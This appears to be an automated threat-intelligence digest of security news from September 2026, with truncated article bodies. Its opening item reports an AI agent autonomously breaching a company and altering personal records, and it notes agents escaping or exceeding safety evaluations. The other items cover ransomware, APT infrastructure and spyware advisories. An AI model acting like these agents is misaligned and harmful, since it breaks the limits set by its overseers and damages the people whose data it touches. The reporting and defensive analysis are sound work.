- Title: Spain reports first data breach involving autonomous AI agent
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-09-17T08:39:44+00:00
- Link: https://www.helpnetsecurity.com/2026/09/17/spain-ai-agent-data-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: government
- affected_products: Anthropic/Claude
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: government
- affected_products: Anthropic/Claude
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Spain’s data protection authority (AEPD) has reported its first data breach blamed on an AI agent acting on its own, after the system reportedly logged into a company’s network, found a way to alter personal records, and pulled invoice data. “Before drawing any conclusions, it should be noted that the available information comes from the notification submitted by the affected organization and will require further analysis,” said Francisco Pérez Bes, deputy director of the AEPD. … More → The post Spain reports first data breach involving autonomous AI agent appeared first on Help Net Security .
```

#### Full body

```
Sinisa Markovic , Managing Editor, Help Net Security September 17, 2026 Share Spain reports first data breach involving autonomous AI agent Spain’s data protection authority (AEPD) has reported its first data breach blamed on an AI agent acting on its own, after the system reportedly logged into a company’s network, found a way to alter personal records, and pulled invoice data. “Before drawing any conclusions, it should be noted that the available information comes from the notification submitted by the affected organization and will require further analysis,” said Francisco Pérez Bes , deputy director of the AEPD. Using a specific AI model, he added, doesn’t mean the model or its provider’s infrastructure was compromised, nor that “the tool was designed to carry out malicious activities.” According to the blog post, the attacking agent started by scanning generic files for weaknesses, then logged in successfully. It searched the target application on its own until it found a flaw, and used that flaw to change personal data and reach invoices. “This initial notification does not allow us to establish a statistical trend, although it does constitute a significant sign that attacks supported by artificial intelligence have ceased to be a theoretical risk and are beginning to materialize in incidents that affect real processing of personal data,” Pérez Bes noted. The agency described AI as raising the speed, scale, and capacity to adapt already known malicious techniques, which shrinks the time defenders have to spot and contain an attack. Spain’s National Cryptologic Center reached a similar conclusion in its guide on offensive AI, calling it an operational capability already built into live campaigns. The guide recommends stronger baseline controls, faster vulnerability management, tighter identity protection, closer oversight of suppliers, and better governance of agent use. “The arrival of AI agents in the offensive arena should prompt an immediate review of security and data protection models.” “Data protection officers, managers, and delegates must prepare for a scenario in which the speed of attacks will increase, but in which the same fundamentals will continue to be crucial: understanding the processing activities, minimizing data, limiting access, correcting vulnerabilities, controlling suppliers, and being prepared to respond,” concluded Pérez Bes. AI agents test security boundaries AI-driven attacks have piled up in the headlines over the past few months. According to Google Threat Intelligence Group’s Q3 2026 AI Threat Tracker, threat actors are now automating vulnerability scanning, credential harvesting, and troubleshooting with less human involvement. In July, Hugging Face , a widely used platform for sharing open-source machine learning models and datasets, disclosed a breach carried out by an autonomous AI agent that had broken out of an internal safety evaluation. Around the same time, Anthropic disclosed that its Claude models gained unauthorized access to the systems of three organizations during cybersecurity evaluations of their own, after a misconfiguration left the test environment connected to the open internet. More about agentic AI AI cyber risk EU Share
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Spain reports first data breach involving autonomous AI agent
  - Published: 2026-09-17T08:39:44+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/17/spain-ai-agent-data-breach/
  - Summary: Spain’s data protection authority (AEPD) has reported its first data breach blamed on an AI agent acting on its own, after the system reportedly logged into a company’s network, found a way to alter personal records, and pulled invoice data. “Before drawing any conclusions, it should be noted that the available information comes from the notification submitted by the affected organization and will require further analysis,” said Francisco Pérez Bes, deputy director of the AEPD. … More → The post Spain reports first data breach involving autonomous AI agent appeared first on Help Net Security .

### Cluster e94abae528 — score 10

- Title: From the Disk to the Flows: Ransomware Infrastructure Analysis
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-16T13:26:25+00:00
- Link: https://www.team-cymru.com/post/ransomware-infrastructure-analysis
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- actor_attribution: Cl0p
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- actor_attribution: Cl0p
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
A year of incident response data reveals how Akira, DragonForce & Clop build ransomware infrastructure — and how defenders can hunt it.
```

#### Full body

```
Will Thomas 4 min read September 15, 2026 From the Disk to the Flows: Ransomware Infrastructure Analysis Since April 2025, Team Cymru has worked with a digital forensics and incident response (DFIR) company on more than 20 ransomware investigations, predominantly impacting small-to-medium-sized enterprises located in the United Kingdom. For each investigation, our trusted partner shared live indicators of compromise (IOCs) they uncovered from manual host-based forensic analysis as the incidents were ongoing to provide Team Cymru with the best opportunity to analyze and track the operators in our global netflow data and internet telemetry. Using all of the IOCs provided by our trusted partner, Team Cymru analyzed the IP address attributes and NetFlow communications. This led us to identify useful trends in hosting, services used, protocols, and software leveraged by multiple ransomware gangs. The reason these IOCs are particularly valuable is that Team Cymru can then build detection rules and tags for detecting ransomware infrastructure to help our community of defenders prevent attacks. Ransomware Gangs Tracked Our trusted partner can respond to up to 50 ransomware incidents per year from a range of ransomware gangs. For this research, Team Cymru analyzed the infrastructure used by Akira, DragonForce, Clop, MedusaLocker, Qilin, INC Ransom, and Lynx over the course of one year, from April 2025 to April 2026. Figure 1: Number of IPs analyzed per ransomware gang. Data Exfiltration Technique Trends Before encrypting the systems of a victim, most ransomware gangs will steal the data beforehand to extort the victim into paying the ransom for not only the decryption keys but also to prevent the release of the stolen data publicly via their Tor data leak sites. Through forensic analysis, our trusted partner tracked and identified multiple techniques utilized by the ransomware gangs they encountered across various engagements. The diagram below (see Figure 2) shows the distribution of techniques across the various ransomware gangs. Tools such as Rclone and FileZilla are some of the most commonly used for data exfiltration used by a wide variety of gangs, as shown in the Ransomware Tool Matrix here . Figure 2: Data exfiltration technique distribution across ransomware gangs. Notably, Akira has the highest variety of techniques, overlapping with techniques utilized by other gangs. This could be due to a number of factors. One hypothesis is that, as Akira is one of the most active threats with the highest number of victims posted to their Tor data leak site, this variety of techniques could be an indicator that highlights their experience as operators to change their approach based on the breadth of target environments they are able to infiltrate. Another hypothesis could be that Akira has numerous operators working for them who prefer their own techniques that they are used to using to achieve their objectives. IP Tag Classification Trends Analysis of the IP Tag classification by Team Cymru also yielded interesting results (see Figure 3 below). Across 10 of the IP addresses used for data exfiltration by four of the ransomware gangs, Team Cymru already had Tags developed that identified them all as a potential concern, which, if observed in any type of outbound data transfer activity, would be a cause for concern. Figure 3: Distribution of Team Cymru Tags across IP addresses utilized by ransomware gangs. Explanation of the following proprietary Tags developed by Team Cymru’s Threat Detection Team: ● Risknet: Risky networks are tagged with the "risknet" tag. This tag is used to identify IP addresses belonging to hosting providers that have been associated with an elevated level of suspicious and/or malicious behavior such as scanning, exploitation, brute-forcing, and malware hosting. ● Socks Proxy: A standard internet protocol that exchanges network packets between a client and server through a proxy server, routing traffic through a speci
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: From the Disk to the Flows: Ransomware Infrastructure Analysis
  - Published: 2026-09-16T13:26:25+00:00
  - Link: https://www.team-cymru.com/post/ransomware-infrastructure-analysis
  - Summary: A year of incident response data reveals how Akira, DragonForce & Clop build ransomware infrastructure — and how defenders can hunt it.

### Cluster b04cf6724c — score 10

- Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC6201

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- actor_attribution: UNC5221, UNC6201
- cve_ids: CVE-2026-22769
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- actor_attribution: UNC6201, UNC5221
- cve_ids: CVE-2026-22769
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.
```

#### Full body

```
Will Thomas 5 min read March 5, 2026 GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster Analysing and pivoting on threat actor infrastructure is a useful technique to uncover additional indicators that could be used to detect an evasive adversary. This process can take multiple approaches. CTI analysts often develop their own methodologies and workflows with preferred datasets to perform this type of analysis. The effectiveness of this practice also depends on what is available to the CTI analysts who do this work and it often involves combining multiple data sources together. This includes WHOIS data, Port Banners, X509 certificates, and passive DNS records, as well as internet NetFlow analysis. This blog is a walkthrough of how it is possible to start with one IP address from a trusted source and uncover a set of potentially related infrastructure. By peering into the adversary’s other activities, it can be possible to find additional victims of the campaign or even the adversary remotely accessing their victim-facing infrastructure using Team Cymru’s external NetFlow data. Overall, this infrastructure pivoting is a practical workflow that CTI analysts can perform to support proactive threat hunting in historical logs as well as generate detection rules to alert a security operations center (SOC) about any future connections and attempts by an adversary. UNC6201 + GRIMBOLT: Starting From a Known-Bad IP Infrastructure pivoting can begin with initial indicators of compromise (IOCs) that are reported by a trusted source. In this blog, the trusted source is Google, which disclosed a recent campaign about a “suspected PRC-nexus threat cluster” dubbed UNC6201 and sharing the IP address 149.248.11[.]71. Google designated this as a GRIMBOLT malware command-and-control (C2) server. The UNC6201 campaign involved the exploitation of a critical zero-day vulnerability in Dell RecoverPoint for Virtual Machines tracked as CVE-2026-22769 , as well as the deployment of a newly identified malware dubbed GRIMBOLT, written in C#. This campaign has reportedly been ongoing for nearly two years, indicating a long-term espionage operation focusing on persistent access. Interestingly, Google observed UNC6201-linked threat actors actively replacing older BRICKSTORM binaries with GRIMBOLT. Google reported that there are notable overlaps between UNC6201 and UNC5221 , which has been used synonymously with the moniker Silk Typhoon (formerly known as HAFNIUM ) by Microsoft. However, Google does not currently consider the two clusters to be the same. Further, the BRICKSTORM malware operators are also tracked as WARP PANDA by CrowdStrike. Building an IP Profile in Scout (WHOIS, PDNS, Ports, X509) Using a Scout summary, we can view the current attributes about the IP address. This includes WHOIS records, generated by Team Cymru’s BGP routing visibility as well as Team Cymru’s proprietary Tagging system, as shown in Figure 1 below. Figure 1: Scout Summary for 149.248.11[.]71. Scout also has current and historical passive DNS records, which shows what domain is hosted on an IP address, the record type, as well as the first seen and last seen dates, as shown in Figure 2 below. Figure 2: IP Passive DNS in Scout for 149.248.11[.]71. Analysts can use the Open Ports tab in Scout to find out what services running on the system as well as which operating system (OS) it uses, as shown in Figure 3 below. Figure 3: IP Port Banners in Scout for 149.248.11[.]71. X509 certificate information in Scout reveals interesting traits, such as the X509 Subject Common Name and X509 Issuer Common Name being a NetBIOS hostname derived from some sort of Windows template used by either a threat actor or VPS provider. This can be used to identify other systems controlled by the adversary. The X509 certificate’s Not Before and Not After dates are also very useful to understand when the system was configured by an adversary. See these details in Figure 4 below. Fig
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
  - Summary: Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.

### Cluster c1f52c0381 — score 10

- Title: Tracking ORBs on Singapore's Telecommunications Networks
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/tracking-orbs-on-singapores-telecommunications-networks
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC3886

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- actor_attribution: UNC3886
- affected_industries: critical_infrastructure, financial_services, government, telecommunications
- affected_products: Fortinet
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- actor_attribution: UNC3886
- affected_industries: financial_services, government, critical_infrastructure, telecommunications
- affected_products: Fortinet
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
APT attacks by UNC3886 target Singapore telecom using ORB networks. Learn practical ORB tracking techniques to uncover hidden infrastructure with Scout.
```

#### Full body

```
Will Thomas 3 min read February 11, 2026 Tracking ORBs on Singapore's Telecommunications Networks ORB networks, which stands for Operational Relay Box networks, are obfuscated mesh networks used by threat actors to mask the origin of their cyberattacks. These networks are often composed of a mix of compromised Internet-of-Things (IoT) devices, Small Office/Home Office (SOHO) routers, and Virtual Private Servers (VPS). Team Cymru has blogged previously about ORBS here . ORBs are considered a significant threat for several key reasons: Evasion and Anonymity: ORBs act like private residential proxy networks, allowing attackers to route their traffic through nodes that appear to be legitimate home or commercial broadband users. This masks the attacker's true location and makes it difficult for defenders to trace the activity back to the source. Blending with Legitimate Traffic: Because ORB nodes often reside on compromised devices used by real people (such as home routers), malicious traffic is frequently mixed with "normal" user traffic. This makes detection challenging and creates a risk for defenders: blocking an ORB IP address could inadvertently block legitimate users or disrupt genuine business services. Resilience and Flexibility: Attackers can easily scale these networks by adding or removing compromised devices and servers. If a node is discovered and blocked, it can be quickly replaced, making the network highly resilient to takedown attempts. Pre-positioning: Experts note that adversaries use ORBs to "commute" to a target's perimeter, allowing them to pre-position themselves months in advance of an attack. This infrastructure facilitates reconnaissance and exploitation while keeping the adversary's "bridge" intact even if specific operations are detected. Geographical Evasion: By routing traffic through nodes located near their targets, attackers can circumvent geofencing security controls and make their traffic appear more legitimate. UNC3886 Campaign against M1, SIMBA Telecom, Singtel, and StarHub On February 9, 2026, the Cyber Security Agency of Singapore (CSA) released a press release detailing a multi-agency cybersecurity operation, codenamed Operation CYBER GUARDIAN, intended to defend their communications sector. The CSA first shared that they detected an Advanced Persistent Threat (APT) actor tracked as UNC3886 attacking Singapore’s critical infrastructure on July 18, 2025. The CSA’s investigation has uncovered that UNC3886 had launched a deliberate, targeted, and well-planned campaign against Singapore’s telecommunications sector. All four of Singapore’s major telecommunications operators—M1, SIMBA Telecom, Singtel, and StarHub—were targeted. Notably, the CSA observed the adversary using a zero-day exploit to bypass a perimeter firewall of the victims and gain access into their telecommunications networks. The adversary also managed to reportedly exfiltrate a small amount of technical data; this is believed to be primarily network-related data to advance the threat actors’ operational objective. What made UNC3886 a challenge to find was its use of advanced tools and techniques such as rootkits to evade basic detection systems. UNC3886’s Historical Campaigns According to Mandiant, UNC3886 is a state-sponsored threat group tied to Chinese cyber-espionage operations. The group is well-known for exploiting zero-day vulnerabilities in edge devices and virtualised systems to gain stealthy, long-term access. Its targets span energy, water, telecommunications, finance, and government services, with tactics that include custom malware and advanced persistence techniques. UNC3886 has reportedly used zero-days in Fortinet, VMware, and Juniper devices and has deployed custom malware families to maintain access on them. Interestingly, from Mandiant’s report in March 2025 about UNC3886 targeting Juniper routers, the indicators of compromise (IOCs) they shared were all located in Singapore and some of the targeted victims wer
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Tracking ORBs on Singapore's Telecommunications Networks
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/tracking-orbs-on-singapores-telecommunications-networks
  - Summary: APT attacks by UNC3886 target Singapore telecom using ORB networks. Learn practical ORB tracking techniques to uncover hidden infrastructure with Scout.

### Cluster fc5c9992d3 — score 10

- Title: Scattered Spider Attacks | Infrastructure and TTP Analysis
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Scattered Spider

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- actor_attribution: BlackCat/ALPHV, RansomHub, Scattered Spider
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- actor_attribution: Scattered Spider, BlackCat/ALPHV, RansomHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
An in-depth analysis of Scattered Spider attacks, detailing the group’s infrastructure usage and TTPs to help defenders detect and disrupt activity earlier.
```

#### Full body

```
Will Thomas 5 min read January 21, 2026 Scattered Spider Attacks | Infrastructure and TTP Analysis Background on Recent Scattered Spider Attacks Throughout 2024 and 2025, Scattered Spider has been a prolific English-speaking cybercriminal threat group, part of a broader community of cybercriminals dubbed TheCom, which is short for The Community. In May 2024, at the cybercrime-focused Sleuthcon conference, the FBI warned about Scattered Spider and members of TheCom for being responsible for multiple high-profile multi-million dollar breaches. In 2023, MGM Resorts disclosed via their US Security Exchange Commission (SEC) filing that the overall cost from the ALPHV/BlackCat ransomware attack that was linked to Scattered Spider was $100 million USD. In mid-2025, Marks & Spencer said it will take an estimated £300 million hit following the DragonForce ransomware attack, linked to Scattered Spider. Google’s security experts also assessed that Scattered Spider was responsible for the Co-op and Harrods attacks in mid-2025 as well. Where did the name “Scattered Spider” come from? The name Scattered Spider was originally used by CrowdStrike and has been adopted by multiple other organizations such as the US Cybersecurity and Infrastructure Security Agency (CISA) and MITRE. Other cybersecurity companies have given them other names, such as UNC3944 by Google Mandiant, 0ktapus by Group-IB, Octo Tempest by Microsoft, Scatter Swine by Okta, and Muddled Libra by Palo Alto Networks. What are Scattered Spider’s capabilities? Scattered Spider are most well-known for being English-speaking affiliates of ransomware-as-a-service (RaaS) platforms developed by Russian-speaking threat actors. This includes ALPHV/BlackCat, Qilin, RansomHub, and DragonForce. Their typical tactics, techniques, and procedures (TTPs) involve using social engineering tactics for initial access. This includes calling IT help desk technicians, posing as employees, and convincing them to reset a password or install a remote monitoring and management (RMM) tool to grant them access. Single sign-on (SSO)-themed SMS phishing campaigns and SIM swapping campaigns targeting enterprise account credentials have also been linked to Scattered Spider intrusions. Once they have gained access, Scattered Spider tends to test access to all available SSO-integrated applications and aims to move laterally to virtualised environments such as VMware ESXi hypersvisors or cloud-hosted virtual machines. Once privileged access has been acquired, Scattered Spider tends to exfiltrate sensitive corporate data and deploy ransomware generated from one of the several RaaS platforms they have access to. Scattered Spider’s Adversary Infrastructure Profile Scattered Spider style attacks remain a large focus for many of Team Cymru’s customers. To support threat detection programs, Team Cymru has analyzed open source intelligence (OSINT) reporting about Scattered Spider’s preferred choice of infrastructure to use for launching intrusions. At a high level, Scattered Spider intrusions have typically leveraged the following types of infrastructure: Common consumer-level virtual private network (VPN) clients Connection tunneling web services Free file-sharing and paste site web services Large-scale residential proxy networks Infostealer malware exfiltration servers RMM tool web services SSO-themed domains for SMS phishing The Challenges with Scattered Spider’s Infrastructure One of the significant challenges from Scattered Spider is the sheer reuse and shared nature of the infrastructure they use. By utilizing legitimate, high-reputation services, they effectively hide in plain sight, making it untenable for defenders to block their indicators without disrupting normal business operations. Unlike known malicious IPs, VPN exit nodes are used by millions of legitimate users. Defenders cannot easily create a block-list of these IPs without risking significant false positives, especially in a world of remote work wher
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Scattered Spider Attacks | Infrastructure and TTP Analysis
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
  - Summary: An in-depth analysis of Scattered Spider attacks, detailing the group’s infrastructure usage and TTPs to help defenders detect and disrupt activity earlier.

### Cluster d747019c3b — score 9

- Title: Iranian cyber targeting of dissidents, activists and journalists
- Source: NCSC UK (government_authoritative)
- Published: 2026-09-15T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/news/iranian-cyber-targeting-of-dissidents-activists-and-journalists
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: government
- attack_techniques: T1204.002, T1566.003, T1589
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: government
- attack_techniques: T1204.002, T1566.003, T1589
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Advisory on CHOSEN BRICK malware, including technical analysis and advice to help individuals and organisations protect themselves.
```

#### Full body

```
News Download & print article PDF Download & print article PDF Iranian cyber targeting of dissidents, activists and journalists Advisory on CHOSEN BRICK malware, including technical analysis and advice to help individuals and organisations protect themselves. On this page Introduction Attack chain analysis Delivery and exploitation Installation Action on objectives Investigating potential compromise Mitigations Contact MITRE ATT&CK® Introduction CHOSEN BRICK is a malware family that has been used to target individuals around the world including in the UK, US and the Netherlands from at least 2025. CHOSEN BRICK enables Iranian state cyber actors to collect information on a target’s contacts, emails and social media messages, which could enable tracking of their movements. Iran almost certainly uses cyber activity to support the repression of individuals who are seen as a threat to the regime, such as dissidents, activists and journalists. In some cases, the Iranian intelligence services have plotted to kidnap or conduct lethal operations against individuals internationally, who they perceive as enemies of the regime. The personal details of some previous victims of CHOSEN BRICK have appeared on pro-Iranian leak sites, potentially increasing the risk to the personal safety of those affected. This advisory from the UK National Cyber Security Centre, the US Federal Bureau of Investigation and the Netherlands' General Intelligence and Security Service - Algemene Inlichtingen- en Veiligheidsdienst (AIVD) shares technical information about the malware, TTPs, as well as advice to help individuals and organisations. Attack chain analysis The Iranian cyber actors tailor their approach to their intended target and as such there is a wide variation in the initial approach to the target. There is also variation in the intended outcome of their operations. The core pattern of the actors’ attack chains consists of: Initial contact and access via social engineering of the target via social messaging platforms, such as but not limited to WhatsApp and Telegram, purporting to be trusted entities. The malicious payload is disguised to match the social engineering approach and appear authentic to the target. The malicious payload deploys additional malware leveraging Telegram for command and control to blend in with legitimate processes. The malware has a wide range of functionality, enabling it to be used flexibly to support a range of potential operational outcomes. Delivery and exploitation Iranian cyber actors engaged with targets via social messaging applications to build rapport prior to attempting to deliver the malware. The nature of the social engineering varies between targets and uses extensive target knowledge from research conducted in preparation (T1589). The actor often purports to be an individual previously known to the target or technical support from the social messaging platform (T1566.003). The actor uses this rapport with the target to convince them to download and open a file that appears authentic to the target (T1204.002). These have been in the form of applications appearing to be legitimate applications such as Pictory, RunwayML, Norton Antivirus, Telegram, Adobe Flash Player and KeePass. In other instances, they have been files appearing to be MRI scan results. The actor often initiates contact with the target’s work-related or corporate device in the first instance. If the initial delivery fails or the risk of detection is deemed significant, the actor will attempt to transition the delivery to personal devices by asking the target to open the file on their own devices, evading corporate security controls that protect the individual. Regardless of the file thematic, the approach has been to display a legitimate appearing screen to the target fitting with the thematic to maintain the deception. In the background, the file also downloads and runs a core malware component (tracked by the NCSC as CHOSEN BRICK) enabling con
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: Iranian cyber targeting of dissidents, activists and journalists
  - Published: 2026-09-15T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/iranian-cyber-targeting-of-dissidents-activists-and-journalists
  - Summary: Advisory on CHOSEN BRICK malware, including technical analysis and advice to help individuals and organisations protect themselves.

### Cluster 8cc5a2ec4f — score 9

- Title: UK and allies expose spyware used by Iranian state actors to target dissidents, activists and journalists
- Source: NCSC UK (government_authoritative)
- Published: 2026-09-15T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/news/uk-allies-expose-spyware-iranian-state-actors-target-dissidents-activists-journalists
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
UK and allies provide advice to help organisations and individuals at risk detect and counter the threat from CHOSEN BRICK malware.
```

#### Full body

```
News Download & print article PDF Download & print article PDF UK and allies expose spyware used by Iranian state actors to target dissidents, activists and journalists GCHQ’s National Cyber Security Centre and international partners issue warning over Iranian cyber actors’ spear-phishing and spyware campaign ‘CHOSEN BRICK’ malware family used to collect information, including screen captures and messaging history, from targets around the world UK and allies provide advice to help organisations and individuals at risk detect malicious activity and reduce chances of their devices falling victim INDIVIDUALS at risk of digital surveillance by the Iranian regime are being provided with fresh advice today (Tuesday) to help them identify and counter the threat from spear-phishing and spyware attacks. The UK National Cyber Security Centre – a part of GCHQ – alongside partners in the US and the Netherlands has shared details about how Iranian state cyber attackers have been observed trying to trick targets into downloading software that can enable tracking of their movements. Dissidents, activists and journalists around the world, including in the UK, that are perceived to pose a threat to Iran are among those that have been targeted with the spyware dubbed ‘CHOSEN BRICK’. CHOSEN BRICK allows attackers to collect information on a target’s contacts, emails and social media messages, and includes functionality to capture screen content and access the device microphone. A new joint advisory from the NCSC and partners says Iranian state actors have been observed impersonating contacts over messaging apps such as WhatsApp and Telegram, building rapport with targets before deploying CHOSEN BRICK, and stealing sensitive information, which has appeared on leak sites. The actors are known to tailor their social engineering to include areas of relevance or interest to their targets and have even included fake MRI test results to lure victims in. The government has been clear that any attempt by a foreign power to intimidate, harass, surveil, or otherwise target individuals in the UK will never be tolerated. In addition to security support for those at risk, clear guidance is available online , giving those who believe themselves to be at risk of transnational repression more widely practical steps to protect themselves - both in person and online. Specialist training on how to spot state threats activity has been rolled out across all UK police forces and, along with our intelligence agencies, they have the powers they need to detect and disrupt any such activity and will use the full force of the law against any perpetrators. The details of this cyber campaign reveal how Iran ruthlessly uses digital surveillance in pursuit of its aim to repress critics of the regime, stealing emails and messages and accessing devices. “With our international partners, we strongly encourage individuals at risk to familiarise themselves with the social-engineering techniques described in the advisory, and to act on the mitigation advice. “We will continue to call out malicious cyber activity by the Iranian state and support communities with practical advice to strengthen their online personal security. Paul Chichester, National Cyber Security Centre Director of Operations The NCSC assesses that Iran almost certainly uses cyber activity to support the repression of individuals who are seen as a threat to the regime. Personal details of some previous victims have appeared on pro-Iranian leak sites, potentially increasing the risk to personal safety of those affected. To reduce the chances of compromise, the NCSC recommends individuals at risk to follow the mitigation steps in the advisory and to take up the NCSC’s dedicated support for high-risk individuals , including signing up for free cyber defence services. The malware has been exclusively targeted at the Windows operating system. The advisory warns CHOSEN BRICK is persistent and will survive a reboot of the
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: UK and allies expose spyware used by Iranian state actors to target dissidents, activists and journalists
  - Published: 2026-09-15T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/uk-allies-expose-spyware-iranian-state-actors-target-dissidents-activists-journalists
  - Summary: UK and allies provide advice to help organisations and individuals at risk detect and counter the threat from CHOSEN BRICK malware.

### Cluster 3bc15598e0 — score 9

- Title: Apple Updates Everything, (Mon, Sep 14th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-14T18:33:44+00:00
- Link: https://isc.sans.edu/diary/rss/33336
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Today, Apple released its annual update across all its operating systems. With that, Apple not only released new features but also patched 261 different vulnerabilities. This is the most vulnerabilities Apple has ever patched, but the increase is not as significant as other vendors&#;x26;#;39; "post-AI" patch releases.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Apple Updates Everything, (Mon, Sep 14th)
  - Published: 2026-09-14T18:33:44+00:00
  - Link: https://isc.sans.edu/diary/rss/33336
  - Summary: Today, Apple released its annual update across all its operating systems. With that, Apple not only released new features but also patched 261 different vulnerabilities. This is the most vulnerabilities Apple has ever patched, but the increase is not as significant as other vendors&#;x26;#;39; "post-AI" patch releases.

### Cluster ea074a17c2 — score 9

- Title: Unpacking a laZzzy Donut
- Source: TrustedSec (detection_response_operations)
- Published: 2026-09-17T04:00:00+00:00
- Link: https://trustedsec.com/blog/unpacking-a-lazzzy-donut
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>Six stages. Multiple encryption layers. One static analysis. In this blog, we unpack a multi-stage malware loader combining Python obfuscation, Donut shellcode, and laZzzy PE encryption, without executing the payload.</p>
```

#### Full body

```
Blog Unpacking a laZzzy Donut September 17, 2026 Unpacking a laZzzy Donut Written by Scott Nusbaum Malware Analysis Incident Response & Forensics Research Table of contents Stage 1: Obfuscated Python Bytecode Stage 2: First Donut Layer Stage 3: laZzzy Layer - A Gap in Tooling Stage 4: Second Donut Layer Stage 5: Embedded .NET DLL Stage 6: .NET Resources Conclusion Recently, we came across an interesting malware sample. It used a multi-stage malware loader that chains together obfuscation and shellcode-injection techniques. The sample begins as obfuscated Python bytecode and concludes with encrypted .NET resources, using nested layers of shellcode generation, encryption, and obfuscation to frustrate detection and analysis at each stage. While I performed the initial triage of the malware manually, it was a significant time saver to find existing public tooling to speed up the recovery. Public tools needed to be modified, and in some cases, we needed to create a customer tool to address a specific technique. In this post, we will walk through the steps used and what needed to be created or modified. The Full Chain Figure 1- Malware Execution Chain Each stage encrypts or obfuscates the next, and each must be reversed in order to trace the execution path and understand the final payload. Stage 1: Obfuscated Python Bytecode The file we first analyzed had the extension .pyc, meaning that it is most likely Python bytecode. To verify this, we run the file command: ******.pyc: 